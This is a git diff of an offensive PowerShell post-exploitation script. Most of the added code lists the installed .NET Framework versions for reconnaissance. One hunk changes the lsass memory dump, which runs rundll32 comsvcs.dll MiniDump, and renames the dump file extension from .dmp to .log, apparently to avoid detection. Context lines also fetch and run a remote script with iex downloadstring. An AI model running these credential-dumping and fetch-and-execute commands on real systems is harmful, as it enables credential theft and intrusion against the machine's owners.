@@ -85,6 +85,36 @@ function dependencychecks
         }
         
         write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1
+
+                    $Lookup = @{
+    378389 = [version]'4.5'
+    378675 = [version]'4.5.1'
+    378758 = [version]'4.5.1'
+    379893 = [version]'4.5.2'
+    393295 = [version]'4.6'
+    393297 = [version]'4.6'
+    394254 = [version]'4.6.1'
+    394271 = [version]'4.6.1'
+    394802 = [version]'4.6.2'
+    394806 = [version]'4.6.2'
+    460798 = [version]'4.7'
+    460805 = [version]'4.7'
+    461308 = [version]'4.7.1'
+    461310 = [version]'4.7.1'
+    461808 = [version]'4.7.2'
+    461814 = [version]'4.7.2'
+    528040 = [version]'4.8'
+    528049 = [version]'4.8'
+    }
+
+    write-host "       [+] -----> Installed .NET Framework versions "
+
+    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
+  Get-ItemProperty -name Version, Release -EA 0 |
+  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
+  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
+@{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
+
 }
 
 function pathCheck
@@ -765,12 +795,12 @@ function Dumplsass
     	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
 	    Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
 	    if(!$consoleoutput){
-            Write-Host "Dumpfile goes to .\Exploitation\$env:computername.dmp "
-	        rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.dmp full
+            Write-Host "Dumpfile goes to .\Exploitation\$env:computername.log "
+	        rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.log full
         }
         else{
-            Write-Host "Dumpfile goes to C:\windows\temp\$env:computername.dmp "
-            rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid C:\windows\temp\$env:computername.dmp full
+            Write-Host "Dumpfile goes to C:\windows\temp\$env:computername.log "
+            rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid C:\windows\temp\$env:computername.log full
         }
 	}
 	catch{
@@ -1150,6 +1180,44 @@ function Generalrecon{
     Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
     if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"}else{Write-Host -ForegroundColor red "SMB Signing State: ";Invoke-SMBNegotiate -ComputerName localhost}
+
+
+    #Check .NET Framework versions in use
+    $Lookup = @{
+    378389 = [version]'4.5'
+    378675 = [version]'4.5.1'
+    378758 = [version]'4.5.1'
+    379893 = [version]'4.5.2'
+    393295 = [version]'4.6'
+    393297 = [version]'4.6'
+    394254 = [version]'4.6.1'
+    394271 = [version]'4.6.1'
+    394802 = [version]'4.6.2'
+    394806 = [version]'4.6.2'
+    460798 = [version]'4.7'
+    460805 = [version]'4.7'
+    461308 = [version]'4.7.1'
+    461310 = [version]'4.7.1'
+    461808 = [version]'4.7.2'
+    461814 = [version]'4.7.2'
+    528040 = [version]'4.8'
+    528049 = [version]'4.8'
+    }
+
+    $Versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
+  Get-ItemProperty -name Version, Release -EA 0 |
+  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
+  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
+@{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
+    
+    if(!$consoleoutput)
+    {
+        $Versions >> "$currentPath\LocalRecon\NetFrameworkVersionsInstalled.txt"
+    }
+    else
+    {
+        $Versions
+    }
 
     #Collecting usefull Informations
     if(!$consoleoutput){
